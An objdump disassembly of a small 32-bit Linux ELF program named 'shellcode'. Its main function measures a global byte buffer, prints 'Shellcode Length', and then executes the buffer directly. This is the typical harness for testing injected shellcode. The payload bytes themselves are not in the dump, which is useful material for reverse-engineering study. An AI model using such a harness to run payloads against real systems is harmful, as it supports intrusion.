
shellcode:     file format elf32-i386


Disassembly of section .interp:

08048154 <.interp>:
 8048154:	2f                   	das    
 8048155:	6c                   	ins    BYTE PTR es:[edi],dx
 8048156:	69 62 2f 6c 64 2d 6c 	imul   esp,DWORD PTR [edx+0x2f],0x6c2d646c
 804815d:	69 6e 75 78 2e 73 6f 	imul   ebp,DWORD PTR [esi+0x75],0x6f732e78
 8048164:	2e 32 00             	xor    al,BYTE PTR cs:[eax]

Disassembly of section .note.ABI-tag:

08048168 <.note.ABI-tag>:
 8048168:	04 00                	add    al,0x0
 804816a:	00 00                	add    BYTE PTR [eax],al
 804816c:	10 00                	adc    BYTE PTR [eax],al
 804816e:	00 00                	add    BYTE PTR [eax],al
 8048170:	01 00                	add    DWORD PTR [eax],eax
 8048172:	00 00                	add    BYTE PTR [eax],al
 8048174:	47                   	inc    edi
 8048175:	4e                   	dec    esi
 8048176:	55                   	push   ebp
 8048177:	00 00                	add    BYTE PTR [eax],al
 8048179:	00 00                	add    BYTE PTR [eax],al
 804817b:	00 02                	add    BYTE PTR [edx],al
 804817d:	00 00                	add    BYTE PTR [eax],al
 804817f:	00 06                	add    BYTE PTR [esi],al
 8048181:	00 00                	add    BYTE PTR [eax],al
 8048183:	00 20                	add    BYTE PTR [eax],ah
 8048185:	00 00                	add    BYTE PTR [eax],al
	...

Disassembly of section .note.gnu.build-id:

08048188 <.note.gnu.build-id>:
 8048188:	04 00                	add    al,0x0
 804818a:	00 00                	add    BYTE PTR [eax],al
 804818c:	14 00                	adc    al,0x0
 804818e:	00 00                	add    BYTE PTR [eax],al
 8048190:	03 00                	add    eax,DWORD PTR [eax]
 8048192:	00 00                	add    BYTE PTR [eax],al
 8048194:	47                   	inc    edi
 8048195:	4e                   	dec    esi
 8048196:	55                   	push   ebp
 8048197:	00 a5 66 09 67 12    	add    BYTE PTR [ebp+0x12670966],ah
 804819d:	ba ab d0 f5 48       	mov    edx,0x48f5d0ab
 80481a2:	de 5f 75             	ficomp WORD PTR [edi+0x75]
 80481a5:	79 4d                	jns    80481f4 <_init-0xd8>
 80481a7:	ff e4                	jmp    esp
 80481a9:	a8 36                	test   al,0x36
 80481ab:	6b                   	.byte 0x6b

Disassembly of section .gnu.hash:

080481ac <.gnu.hash>:
 80481ac:	02 00                	add    al,BYTE PTR [eax]
 80481ae:	00 00                	add    BYTE PTR [eax],al
 80481b0:	05 00 00 00 01       	add    eax,0x1000000
 80481b5:	00 00                	add    BYTE PTR [eax],al
 80481b7:	00 05 00 00 00 00    	add    BYTE PTR ds:0x0,al
 80481bd:	20 00                	and    BYTE PTR [eax],al
 80481bf:	20 00                	and    BYTE PTR [eax],al
 80481c1:	00 00                	add    BYTE PTR [eax],al
 80481c3:	00 05 00 00 00 ad    	add    BYTE PTR ds:0xad000000,al
 80481c9:	4b                   	dec    ebx
 80481ca:	e3 c0                	jecxz  804818c <_init-0x140>

Disassembly of section .dynsym:

080481cc <.dynsym>:
	...
 80481dc:	1a 00                	sbb    al,BYTE PTR [eax]
	...
 80481e6:	00 00                	add    BYTE PTR [eax],al
 80481e8:	12 00                	adc    al,BYTE PTR [eax]
 80481ea:	00 00                	add    BYTE PTR [eax],al
 80481ec:	3a 00                	cmp    al,BYTE PTR [eax]
	...
 80481f6:	00 00                	add    BYTE PTR [eax],al
 80481f8:	20 00                	and    BYTE PTR [eax],al
 80481fa:	00 00                	add    BYTE PTR [eax],al
 80481fc:	21 00                	and    DWORD PTR [eax],eax
	...
 8048206:	00 00                	add    BYTE PTR [eax],al
 8048208:	12 00                	adc    al,BYTE PTR [eax]
 804820a:	00 00                	add    BYTE PTR [eax],al
 804820c:	28 00                	sub    BYTE PTR [eax],al
	...
 8048216:	00 00                	add    BYTE PTR [eax],al
 8048218:	12 00                	adc    al,BYTE PTR [eax]
 804821a:	00 00                	add    BYTE PTR [eax],al
 804821c:	0b 00                	or     eax,DWORD PTR [eax]
 804821e:	00 00                	add    BYTE PTR [eax],al
 8048220:	0c 85                	or     al,0x85
 8048222:	04 08                	add    al,0x8
 8048224:	04 00                	add    al,0x0
 8048226:	00 00                	add    BYTE PTR [eax],al
 8048228:	11 00                	adc    DWORD PTR [eax],eax
 804822a:	10 00                	adc    BYTE PTR [eax],al

Disassembly of section .dynstr:

0804822c <.dynstr>:
 804822c:	00 6c 69 62          	add    BYTE PTR [ecx+ebp*2+0x62],ch
 8048230:	63 2e                	arpl   WORD PTR [esi],bp
 8048232:	73 6f                	jae    80482a3 <_init-0x29>
 8048234:	2e 36 00 5f 49       	cs add BYTE PTR ss:[edi+0x49],bl
 8048239:	4f                   	dec    edi
 804823a:	5f                   	pop    edi
 804823b:	73 74                	jae    80482b1 <_init-0x1b>
 804823d:	64 69 6e 5f 75 73 65 	imul   ebp,DWORD PTR fs:[esi+0x5f],0x64657375
 8048244:	64 
 8048245:	00 70 72             	add    BYTE PTR [eax+0x72],dh
 8048248:	69 6e 74 66 00 73 74 	imul   ebp,DWORD PTR [esi+0x74],0x74730066
 804824f:	72 6c                	jb     80482bd <_init-0xf>
 8048251:	65 6e                	outs   dx,BYTE PTR gs:[esi]
 8048253:	00 5f 5f             	add    BYTE PTR [edi+0x5f],bl
 8048256:	6c                   	ins    BYTE PTR es:[edi],dx
 8048257:	69 62 63 5f 73 74 61 	imul   esp,DWORD PTR [edx+0x63],0x6174735f
 804825e:	72 74                	jb     80482d4 <_init+0x8>
 8048260:	5f                   	pop    edi
 8048261:	6d                   	ins    DWORD PTR es:[edi],dx
 8048262:	61                   	popa   
 8048263:	69 6e 00 5f 5f 67 6d 	imul   ebp,DWORD PTR [esi+0x0],0x6d675f5f
 804826a:	6f                   	outs   dx,DWORD PTR ds:[esi]
 804826b:	6e                   	outs   dx,BYTE PTR ds:[esi]
 804826c:	5f                   	pop    edi
 804826d:	73 74                	jae    80482e3 <_init+0x17>
 804826f:	61                   	popa   
 8048270:	72 74                	jb     80482e6 <_init+0x1a>
 8048272:	5f                   	pop    edi
 8048273:	5f                   	pop    edi
 8048274:	00 47 4c             	add    BYTE PTR [edi+0x4c],al
 8048277:	49                   	dec    ecx
 8048278:	42                   	inc    edx
 8048279:	43                   	inc    ebx
 804827a:	5f                   	pop    edi
 804827b:	32 2e                	xor    ch,BYTE PTR [esi]
 804827d:	30 00                	xor    BYTE PTR [eax],al

Disassembly of section .gnu.version:

08048280 <.gnu.version>:
 8048280:	00 00                	add    BYTE PTR [eax],al
 8048282:	02 00                	add    al,BYTE PTR [eax]
 8048284:	00 00                	add    BYTE PTR [eax],al
 8048286:	02 00                	add    al,BYTE PTR [eax]
 8048288:	02 00                	add    al,BYTE PTR [eax]
 804828a:	01 00                	add    DWORD PTR [eax],eax

Disassembly of section .gnu.version_r:

0804828c <.gnu.version_r>:
 804828c:	01 00                	add    DWORD PTR [eax],eax
 804828e:	01 00                	add    DWORD PTR [eax],eax
 8048290:	01 00                	add    DWORD PTR [eax],eax
 8048292:	00 00                	add    BYTE PTR [eax],al
 8048294:	10 00                	adc    BYTE PTR [eax],al
 8048296:	00 00                	add    BYTE PTR [eax],al
 8048298:	00 00                	add    BYTE PTR [eax],al
 804829a:	00 00                	add    BYTE PTR [eax],al
 804829c:	10 69 69             	adc    BYTE PTR [ecx+0x69],ch
 804829f:	0d 00 00 02 00       	or     eax,0x20000
 80482a4:	49                   	dec    ecx
 80482a5:	00 00                	add    BYTE PTR [eax],al
 80482a7:	00 00                	add    BYTE PTR [eax],al
 80482a9:	00 00                	add    BYTE PTR [eax],al
	...

Disassembly of section .rel.dyn:

080482ac <.rel.dyn>:
 80482ac:	fc                   	cld    
 80482ad:	9f                   	lahf   
 80482ae:	04 08                	add    al,0x8
 80482b0:	06                   	push   es
 80482b1:	02 00                	add    al,BYTE PTR [eax]
	...

Disassembly of section .rel.plt:

080482b4 <.rel.plt>:
 80482b4:	0c a0                	or     al,0xa0
 80482b6:	04 08                	add    al,0x8
 80482b8:	07                   	pop    es
 80482b9:	01 00                	add    DWORD PTR [eax],eax
 80482bb:	00 10                	add    BYTE PTR [eax],dl
 80482bd:	a0 04 08 07 03       	mov    al,ds:0x3070804
 80482c2:	00 00                	add    BYTE PTR [eax],al
 80482c4:	14 a0                	adc    al,0xa0
 80482c6:	04 08                	add    al,0x8
 80482c8:	07                   	pop    es
 80482c9:	04 00                	add    al,0x0
	...

Disassembly of section .init:

080482cc <_init>:
 80482cc:	53                   	push   ebx
 80482cd:	83 ec 08             	sub    esp,0x8
 80482d0:	e8 9b 00 00 00       	call   8048370 <__x86.get_pc_thunk.bx>
 80482d5:	81 c3 2b 1d 00 00    	add    ebx,0x1d2b
 80482db:	8b 83 fc ff ff ff    	mov    eax,DWORD PTR [ebx-0x4]
 80482e1:	85 c0                	test   eax,eax
 80482e3:	74 05                	je     80482ea <_init+0x1e>
 80482e5:	e8 46 00 00 00       	call   8048330 <__libc_start_main@plt+0x10>
 80482ea:	83 c4 08             	add    esp,0x8
 80482ed:	5b                   	pop    ebx
 80482ee:	c3                   	ret    

Disassembly of section .plt:

080482f0 <printf@plt-0x10>:
 80482f0:	ff 35 04 a0 04 08    	push   DWORD PTR ds:0x804a004
 80482f6:	ff 25 08 a0 04 08    	jmp    DWORD PTR ds:0x804a008
 80482fc:	00 00                	add    BYTE PTR [eax],al
	...

08048300 <printf@plt>:
 8048300:	ff 25 0c a0 04 08    	jmp    DWORD PTR ds:0x804a00c
 8048306:	68 00 00 00 00       	push   0x0
 804830b:	e9 e0 ff ff ff       	jmp    80482f0 <_init+0x24>

08048310 <strlen@plt>:
 8048310:	ff 25 10 a0 04 08    	jmp    DWORD PTR ds:0x804a010
 8048316:	68 08 00 00 00       	push   0x8
 804831b:	e9 d0 ff ff ff       	jmp    80482f0 <_init+0x24>

08048320 <__libc_start_main@plt>:
 8048320:	ff 25 14 a0 04 08    	jmp    DWORD PTR ds:0x804a014
 8048326:	68 10 00 00 00       	push   0x10
 804832b:	e9 c0 ff ff ff       	jmp    80482f0 <_init+0x24>

Disassembly of section .plt.got:

08048330 <.plt.got>:
 8048330:	ff 25 fc 9f 04 08    	jmp    DWORD PTR ds:0x8049ffc
 8048336:	66 90                	xchg   ax,ax

Disassembly of section .text:

08048340 <_start>:
 8048340:	31 ed                	xor    ebp,ebp
 8048342:	5e                   	pop    esi
 8048343:	89 e1                	mov    ecx,esp
 8048345:	83 e4 f0             	and    esp,0xfffffff0
 8048348:	50                   	push   eax
 8048349:	54                   	push   esp
 804834a:	52                   	push   edx
 804834b:	68 f0 84 04 08       	push   0x80484f0
 8048350:	68 90 84 04 08       	push   0x8048490
 8048355:	51                   	push   ecx
 8048356:	56                   	push   esi
 8048357:	68 3b 84 04 08       	push   0x804843b
 804835c:	e8 bf ff ff ff       	call   8048320 <__libc_start_main@plt>
 8048361:	f4                   	hlt    
 8048362:	66 90                	xchg   ax,ax
 8048364:	66 90                	xchg   ax,ax
 8048366:	66 90                	xchg   ax,ax
 8048368:	66 90                	xchg   ax,ax
 804836a:	66 90                	xchg   ax,ax
 804836c:	66 90                	xchg   ax,ax
 804836e:	66 90                	xchg   ax,ax

08048370 <__x86.get_pc_thunk.bx>:
 8048370:	8b 1c 24             	mov    ebx,DWORD PTR [esp]
 8048373:	c3                   	ret    
 8048374:	66 90                	xchg   ax,ax
 8048376:	66 90                	xchg   ax,ax
 8048378:	66 90                	xchg   ax,ax
 804837a:	66 90                	xchg   ax,ax
 804837c:	66 90                	xchg   ax,ax
 804837e:	66 90                	xchg   ax,ax

08048380 <deregister_tm_clones>:
 8048380:	b8 33 a1 04 08       	mov    eax,0x804a133
 8048385:	2d 30 a1 04 08       	sub    eax,0x804a130
 804838a:	83 f8 06             	cmp    eax,0x6
 804838d:	76 1a                	jbe    80483a9 <deregister_tm_clones+0x29>
 804838f:	b8 00 00 00 00       	mov    eax,0x0
 8048394:	85 c0                	test   eax,eax
 8048396:	74 11                	je     80483a9 <deregister_tm_clones+0x29>
 8048398:	55                   	push   ebp
 8048399:	89 e5                	mov    ebp,esp
 804839b:	83 ec 14             	sub    esp,0x14
 804839e:	68 30 a1 04 08       	push   0x804a130
 80483a3:	ff d0                	call   eax
 80483a5:	83 c4 10             	add    esp,0x10
 80483a8:	c9                   	leave  
 80483a9:	f3 c3                	repz ret 
 80483ab:	90                   	nop
 80483ac:	8d 74 26 00          	lea    esi,[esi+eiz*1+0x0]

080483b0 <register_tm_clones>:
 80483b0:	b8 30 a1 04 08       	mov    eax,0x804a130
 80483b5:	2d 30 a1 04 08       	sub    eax,0x804a130
 80483ba:	c1 f8 02             	sar    eax,0x2
 80483bd:	89 c2                	mov    edx,eax
 80483bf:	c1 ea 1f             	shr    edx,0x1f
 80483c2:	01 d0                	add    eax,edx
 80483c4:	d1 f8                	sar    eax,1
 80483c6:	74 1b                	je     80483e3 <register_tm_clones+0x33>
 80483c8:	ba 00 00 00 00       	mov    edx,0x0
 80483cd:	85 d2                	test   edx,edx
 80483cf:	74 12                	je     80483e3 <register_tm_clones+0x33>
 80483d1:	55                   	push   ebp
 80483d2:	89 e5                	mov    ebp,esp
 80483d4:	83 ec 10             	sub    esp,0x10
 80483d7:	50                   	push   eax
 80483d8:	68 30 a1 04 08       	push   0x804a130
 80483dd:	ff d2                	call   edx
 80483df:	83 c4 10             	add    esp,0x10
 80483e2:	c9                   	leave  
 80483e3:	f3 c3                	repz ret 
 80483e5:	8d 74 26 00          	lea    esi,[esi+eiz*1+0x0]
 80483e9:	8d bc 27 00 00 00 00 	lea    edi,[edi+eiz*1+0x0]

080483f0 <__do_global_dtors_aux>:
 80483f0:	80 3d 2f a1 04 08 00 	cmp    BYTE PTR ds:0x804a12f,0x0
 80483f7:	75 13                	jne    804840c <__do_global_dtors_aux+0x1c>
 80483f9:	55                   	push   ebp
 80483fa:	89 e5                	mov    ebp,esp
 80483fc:	83 ec 08             	sub    esp,0x8
 80483ff:	e8 7c ff ff ff       	call   8048380 <deregister_tm_clones>
 8048404:	c6 05 2f a1 04 08 01 	mov    BYTE PTR ds:0x804a12f,0x1
 804840b:	c9                   	leave  
 804840c:	f3 c3                	repz ret 
 804840e:	66 90                	xchg   ax,ax

08048410 <frame_dummy>:
 8048410:	b8 10 9f 04 08       	mov    eax,0x8049f10
 8048415:	8b 10                	mov    edx,DWORD PTR [eax]
 8048417:	85 d2                	test   edx,edx
 8048419:	75 05                	jne    8048420 <frame_dummy+0x10>
 804841b:	eb 93                	jmp    80483b0 <register_tm_clones>
 804841d:	8d 76 00             	lea    esi,[esi+0x0]
 8048420:	ba 00 00 00 00       	mov    edx,0x0
 8048425:	85 d2                	test   edx,edx
 8048427:	74 f2                	je     804841b <frame_dummy+0xb>
 8048429:	55                   	push   ebp
 804842a:	89 e5                	mov    ebp,esp
 804842c:	83 ec 14             	sub    esp,0x14
 804842f:	50                   	push   eax
 8048430:	ff d2                	call   edx
 8048432:	83 c4 10             	add    esp,0x10
 8048435:	c9                   	leave  
 8048436:	e9 75 ff ff ff       	jmp    80483b0 <register_tm_clones>

0804843b <main>:
 804843b:	8d 4c 24 04          	lea    ecx,[esp+0x4]
 804843f:	83 e4 f0             	and    esp,0xfffffff0
 8048442:	ff 71 fc             	push   DWORD PTR [ecx-0x4]
 8048445:	55                   	push   ebp
 8048446:	89 e5                	mov    ebp,esp
 8048448:	51                   	push   ecx
 8048449:	83 ec 14             	sub    esp,0x14
 804844c:	83 ec 0c             	sub    esp,0xc
 804844f:	68 a0 a0 04 08       	push   0x804a0a0
 8048454:	e8 b7 fe ff ff       	call   8048310 <strlen@plt>
 8048459:	83 c4 10             	add    esp,0x10
 804845c:	83 ec 08             	sub    esp,0x8
 804845f:	50                   	push   eax
 8048460:	68 10 85 04 08       	push   0x8048510
 8048465:	e8 96 fe ff ff       	call   8048300 <printf@plt>
 804846a:	83 c4 10             	add    esp,0x10
 804846d:	c7 45 f4 a0 a0 04 08 	mov    DWORD PTR [ebp-0xc],0x804a0a0
 8048474:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 8048477:	ff d0                	call   eax
 8048479:	b8 00 00 00 00       	mov    eax,0x0
 804847e:	8b 4d fc             	mov    ecx,DWORD PTR [ebp-0x4]
 8048481:	c9                   	leave  
 8048482:	8d 61 fc             	lea    esp,[ecx-0x4]
 8048485:	c3                   	ret    
 8048486:	66 90                	xchg   ax,ax
 8048488:	66 90                	xchg   ax,ax
 804848a:	66 90                	xchg   ax,ax
 804848c:	66 90                	xchg   ax,ax
 804848e:	66 90                	xchg   ax,ax

08048490 <__libc_csu_init>:
 8048490:	55                   	push   ebp
 8048491:	57                   	push   edi
 8048492:	56                   	push   esi
 8048493:	53                   	push   ebx
 8048494:	e8 d7 fe ff ff       	call   8048370 <__x86.get_pc_thunk.bx>
 8048499:	81 c3 67 1b 00 00    	add    ebx,0x1b67
 804849f:	83 ec 0c             	sub    esp,0xc
 80484a2:	8b 6c 24 20          	mov    ebp,DWORD PTR [esp+0x20]
 80484a6:	8d b3 0c ff ff ff    	lea    esi,[ebx-0xf4]
 80484ac:	e8 1b fe ff ff       	call   80482cc <_init>
 80484b1:	8d 83 08 ff ff ff    	lea    eax,[ebx-0xf8]
 80484b7:	29 c6                	sub    esi,eax
 80484b9:	c1 fe 02             	sar    esi,0x2
 80484bc:	85 f6                	test   esi,esi
 80484be:	74 25                	je     80484e5 <__libc_csu_init+0x55>
 80484c0:	31 ff                	xor    edi,edi
 80484c2:	8d b6 00 00 00 00    	lea    esi,[esi+0x0]
 80484c8:	83 ec 04             	sub    esp,0x4
 80484cb:	ff 74 24 2c          	push   DWORD PTR [esp+0x2c]
 80484cf:	ff 74 24 2c          	push   DWORD PTR [esp+0x2c]
 80484d3:	55                   	push   ebp
 80484d4:	ff 94 bb 08 ff ff ff 	call   DWORD PTR [ebx+edi*4-0xf8]
 80484db:	83 c7 01             	add    edi,0x1
 80484de:	83 c4 10             	add    esp,0x10
 80484e1:	39 f7                	cmp    edi,esi
 80484e3:	75 e3                	jne    80484c8 <__libc_csu_init+0x38>
 80484e5:	83 c4 0c             	add    esp,0xc
 80484e8:	5b                   	pop    ebx
 80484e9:	5e                   	pop    esi
 80484ea:	5f                   	pop    edi
 80484eb:	5d                   	pop    ebp
 80484ec:	c3                   	ret    
 80484ed:	8d 76 00             	lea    esi,[esi+0x0]

080484f0 <__libc_csu_fini>:
 80484f0:	f3 c3                	repz ret 

Disassembly of section .fini:

080484f4 <_fini>:
 80484f4:	53                   	push   ebx
 80484f5:	83 ec 08             	sub    esp,0x8
 80484f8:	e8 73 fe ff ff       	call   8048370 <__x86.get_pc_thunk.bx>
 80484fd:	81 c3 03 1b 00 00    	add    ebx,0x1b03
 8048503:	83 c4 08             	add    esp,0x8
 8048506:	5b                   	pop    ebx
 8048507:	c3                   	ret    

Disassembly of section .rodata:

08048508 <_fp_hw>:
 8048508:	03 00                	add    eax,DWORD PTR [eax]
	...

0804850c <_IO_stdin_used>:
 804850c:	01 00                	add    DWORD PTR [eax],eax
 804850e:	02 00                	add    al,BYTE PTR [eax]
 8048510:	53                   	push   ebx
 8048511:	68 65 6c 6c 63       	push   0x636c6c65
 8048516:	6f                   	outs   dx,DWORD PTR ds:[esi]
 8048517:	64 65 20 4c 65 6e    	fs and BYTE PTR gs:[ebp+eiz*2+0x6e],cl
 804851d:	67 74 68             	addr16 je 8048588 <__GNU_EH_FRAME_HDR+0x60>
 8048520:	3a 20                	cmp    ah,BYTE PTR [eax]
 8048522:	20                   	.byte 0x20
 8048523:	25                   	.byte 0x25
 8048524:	64 0a 00             	or     al,BYTE PTR fs:[eax]

Disassembly of section .eh_frame_hdr:

08048528 <__GNU_EH_FRAME_HDR>:
 8048528:	01 1b                	add    DWORD PTR [ebx],ebx
 804852a:	03 3b                	add    edi,DWORD PTR [ebx]
 804852c:	28 00                	sub    BYTE PTR [eax],al
 804852e:	00 00                	add    BYTE PTR [eax],al
 8048530:	04 00                	add    al,0x0
 8048532:	00 00                	add    BYTE PTR [eax],al
 8048534:	c8 fd ff ff          	enter  0xfffd,0xff
 8048538:	44                   	inc    esp
 8048539:	00 00                	add    BYTE PTR [eax],al
 804853b:	00 13                	add    BYTE PTR [ebx],dl
 804853d:	ff                   	(bad)  
 804853e:	ff                   	(bad)  
 804853f:	ff 68 00             	jmp    FWORD PTR [eax+0x0]
 8048542:	00 00                	add    BYTE PTR [eax],al
 8048544:	68 ff ff ff 94       	push   0x94ffffff
 8048549:	00 00                	add    BYTE PTR [eax],al
 804854b:	00 c8                	add    al,cl
 804854d:	ff                   	(bad)  
 804854e:	ff                   	(bad)  
 804854f:	ff e0                	jmp    eax
 8048551:	00 00                	add    BYTE PTR [eax],al
	...

Disassembly of section .eh_frame:

08048554 <__FRAME_END__-0xc8>:
 8048554:	14 00                	adc    al,0x0
 8048556:	00 00                	add    BYTE PTR [eax],al
 8048558:	00 00                	add    BYTE PTR [eax],al
 804855a:	00 00                	add    BYTE PTR [eax],al
 804855c:	01 7a 52             	add    DWORD PTR [edx+0x52],edi
 804855f:	00 01                	add    BYTE PTR [ecx],al
 8048561:	7c 08                	jl     804856b <__GNU_EH_FRAME_HDR+0x43>
 8048563:	01 1b                	add    DWORD PTR [ebx],ebx
 8048565:	0c 04                	or     al,0x4
 8048567:	04 88                	add    al,0x88
 8048569:	01 00                	add    DWORD PTR [eax],eax
 804856b:	00 20                	add    BYTE PTR [eax],ah
 804856d:	00 00                	add    BYTE PTR [eax],al
 804856f:	00 1c 00             	add    BYTE PTR [eax+eax*1],bl
 8048572:	00 00                	add    BYTE PTR [eax],al
 8048574:	7c fd                	jl     8048573 <__GNU_EH_FRAME_HDR+0x4b>
 8048576:	ff                   	(bad)  
 8048577:	ff 40 00             	inc    DWORD PTR [eax+0x0]
 804857a:	00 00                	add    BYTE PTR [eax],al
 804857c:	00 0e                	add    BYTE PTR [esi],cl
 804857e:	08 46 0e             	or     BYTE PTR [esi+0xe],al
 8048581:	0c 4a                	or     al,0x4a
 8048583:	0f 0b                	ud2    
 8048585:	74 04                	je     804858b <__GNU_EH_FRAME_HDR+0x63>
 8048587:	78 00                	js     8048589 <__GNU_EH_FRAME_HDR+0x61>
 8048589:	3f                   	aas    
 804858a:	1a 3b                	sbb    bh,BYTE PTR [ebx]
 804858c:	2a 32                	sub    dh,BYTE PTR [edx]
 804858e:	24 22                	and    al,0x22
 8048590:	28 00                	sub    BYTE PTR [eax],al
 8048592:	00 00                	add    BYTE PTR [eax],al
 8048594:	40                   	inc    eax
 8048595:	00 00                	add    BYTE PTR [eax],al
 8048597:	00 a3 fe ff ff 4b    	add    BYTE PTR [ebx+0x4bfffffe],ah
 804859d:	00 00                	add    BYTE PTR [eax],al
 804859f:	00 00                	add    BYTE PTR [eax],al
 80485a1:	44                   	inc    esp
 80485a2:	0c 01                	or     al,0x1
 80485a4:	00 47 10             	add    BYTE PTR [edi+0x10],al
 80485a7:	05 02 75 00 43       	add    eax,0x43007502
 80485ac:	0f 03 75 7c          	lsl    esi,WORD PTR [ebp+0x7c]
 80485b0:	06                   	push   es
 80485b1:	78 0c                	js     80485bf <__GNU_EH_FRAME_HDR+0x97>
 80485b3:	01 00                	add    DWORD PTR [eax],eax
 80485b5:	41                   	inc    ecx
 80485b6:	c5 43 0c             	lds    eax,FWORD PTR [ebx+0xc]
 80485b9:	04 04                	add    al,0x4
 80485bb:	00 48 00             	add    BYTE PTR [eax+0x0],cl
 80485be:	00 00                	add    BYTE PTR [eax],al
 80485c0:	6c                   	ins    BYTE PTR es:[edi],dx
 80485c1:	00 00                	add    BYTE PTR [eax],al
 80485c3:	00 cc                	add    ah,cl
 80485c5:	fe                   	(bad)  
 80485c6:	ff                   	(bad)  
 80485c7:	ff 5d 00             	call   FWORD PTR [ebp+0x0]
 80485ca:	00 00                	add    BYTE PTR [eax],al
 80485cc:	00 41 0e             	add    BYTE PTR [ecx+0xe],al
 80485cf:	08 85 02 41 0e 0c    	or     BYTE PTR [ebp+0xc0e4102],al
 80485d5:	87 03                	xchg   DWORD PTR [ebx],eax
 80485d7:	41                   	inc    ecx
 80485d8:	0e                   	push   cs
 80485d9:	10 86 04 41 0e 14    	adc    BYTE PTR [esi+0x140e4104],al
 80485df:	83 05 4e 0e 20 69 0e 	add    DWORD PTR ds:0x69200e4e,0xe
 80485e6:	24 44                	and    al,0x44
 80485e8:	0e                   	push   cs
 80485e9:	28 44 0e 2c          	sub    BYTE PTR [esi+ecx*1+0x2c],al
 80485ed:	41                   	inc    ecx
 80485ee:	0e                   	push   cs
 80485ef:	30 4d 0e             	xor    BYTE PTR [ebp+0xe],cl
 80485f2:	20 47 0e             	and    BYTE PTR [edi+0xe],al
 80485f5:	14 41                	adc    al,0x41
 80485f7:	c3                   	ret    
 80485f8:	0e                   	push   cs
 80485f9:	10 41 c6             	adc    BYTE PTR [ecx-0x3a],al
 80485fc:	0e                   	push   cs
 80485fd:	0c 41                	or     al,0x41
 80485ff:	c7                   	(bad)  
 8048600:	0e                   	push   cs
 8048601:	08 41 c5             	or     BYTE PTR [ecx-0x3b],al
 8048604:	0e                   	push   cs
 8048605:	04 00                	add    al,0x0
 8048607:	00 10                	add    BYTE PTR [eax],dl
 8048609:	00 00                	add    BYTE PTR [eax],al
 804860b:	00 b8 00 00 00 e0    	add    BYTE PTR [eax-0x20000000],bh
 8048611:	fe                   	(bad)  
 8048612:	ff                   	(bad)  
 8048613:	ff 02                	inc    DWORD PTR [edx]
 8048615:	00 00                	add    BYTE PTR [eax],al
 8048617:	00 00                	add    BYTE PTR [eax],al
 8048619:	00 00                	add    BYTE PTR [eax],al
	...

0804861c <__FRAME_END__>:
 804861c:	00 00                	add    BYTE PTR [eax],al
	...

Disassembly of section .init_array:

08049f08 <__frame_dummy_init_array_entry>:
 8049f08:	10                   	.byte 0x10
 8049f09:	84 04 08             	test   BYTE PTR [eax+ecx*1],al

Disassembly of section .fini_array:

08049f0c <__do_global_dtors_aux_fini_array_entry>:
 8049f0c:	f0                   	lock
 8049f0d:	83                   	.byte 0x83
 8049f0e:	04 08                	add    al,0x8

Disassembly of section .jcr:

08049f10 <__JCR_END__>:
 8049f10:	00 00                	add    BYTE PTR [eax],al
	...

Disassembly of section .dynamic:

08049f14 <_DYNAMIC>:
 8049f14:	01 00                	add    DWORD PTR [eax],eax
 8049f16:	00 00                	add    BYTE PTR [eax],al
 8049f18:	01 00                	add    DWORD PTR [eax],eax
 8049f1a:	00 00                	add    BYTE PTR [eax],al
 8049f1c:	0c 00                	or     al,0x0
 8049f1e:	00 00                	add    BYTE PTR [eax],al
 8049f20:	cc                   	int3   
 8049f21:	82                   	(bad)  
 8049f22:	04 08                	add    al,0x8
 8049f24:	0d 00 00 00 f4       	or     eax,0xf4000000
 8049f29:	84 04 08             	test   BYTE PTR [eax+ecx*1],al
 8049f2c:	19 00                	sbb    DWORD PTR [eax],eax
 8049f2e:	00 00                	add    BYTE PTR [eax],al
 8049f30:	08 9f 04 08 1b 00    	or     BYTE PTR [edi+0x1b0804],bl
 8049f36:	00 00                	add    BYTE PTR [eax],al
 8049f38:	04 00                	add    al,0x0
 8049f3a:	00 00                	add    BYTE PTR [eax],al
 8049f3c:	1a 00                	sbb    al,BYTE PTR [eax]
 8049f3e:	00 00                	add    BYTE PTR [eax],al
 8049f40:	0c 9f                	or     al,0x9f
 8049f42:	04 08                	add    al,0x8
 8049f44:	1c 00                	sbb    al,0x0
 8049f46:	00 00                	add    BYTE PTR [eax],al
 8049f48:	04 00                	add    al,0x0
 8049f4a:	00 00                	add    BYTE PTR [eax],al
 8049f4c:	f5                   	cmc    
 8049f4d:	fe                   	(bad)  
 8049f4e:	ff 6f ac             	jmp    FWORD PTR [edi-0x54]
 8049f51:	81 04 08 05 00 00 00 	add    DWORD PTR [eax+ecx*1],0x5
 8049f58:	2c 82                	sub    al,0x82
 8049f5a:	04 08                	add    al,0x8
 8049f5c:	06                   	push   es
 8049f5d:	00 00                	add    BYTE PTR [eax],al
 8049f5f:	00 cc                	add    ah,cl
 8049f61:	81 04 08 0a 00 00 00 	add    DWORD PTR [eax+ecx*1],0xa
 8049f68:	53                   	push   ebx
 8049f69:	00 00                	add    BYTE PTR [eax],al
 8049f6b:	00 0b                	add    BYTE PTR [ebx],cl
 8049f6d:	00 00                	add    BYTE PTR [eax],al
 8049f6f:	00 10                	add    BYTE PTR [eax],dl
 8049f71:	00 00                	add    BYTE PTR [eax],al
 8049f73:	00 15 00 00 00 00    	add    BYTE PTR ds:0x0,dl
 8049f79:	00 00                	add    BYTE PTR [eax],al
 8049f7b:	00 03                	add    BYTE PTR [ebx],al
 8049f7d:	00 00                	add    BYTE PTR [eax],al
 8049f7f:	00 00                	add    BYTE PTR [eax],al
 8049f81:	a0 04 08 02 00       	mov    al,ds:0x20804
 8049f86:	00 00                	add    BYTE PTR [eax],al
 8049f88:	18 00                	sbb    BYTE PTR [eax],al
 8049f8a:	00 00                	add    BYTE PTR [eax],al
 8049f8c:	14 00                	adc    al,0x0
 8049f8e:	00 00                	add    BYTE PTR [eax],al
 8049f90:	11 00                	adc    DWORD PTR [eax],eax
 8049f92:	00 00                	add    BYTE PTR [eax],al
 8049f94:	17                   	pop    ss
 8049f95:	00 00                	add    BYTE PTR [eax],al
 8049f97:	00 b4 82 04 08 11 00 	add    BYTE PTR [edx+eax*4+0x110804],dh
 8049f9e:	00 00                	add    BYTE PTR [eax],al
 8049fa0:	ac                   	lods   al,BYTE PTR ds:[esi]
 8049fa1:	82                   	(bad)  
 8049fa2:	04 08                	add    al,0x8
 8049fa4:	12 00                	adc    al,BYTE PTR [eax]
 8049fa6:	00 00                	add    BYTE PTR [eax],al
 8049fa8:	08 00                	or     BYTE PTR [eax],al
 8049faa:	00 00                	add    BYTE PTR [eax],al
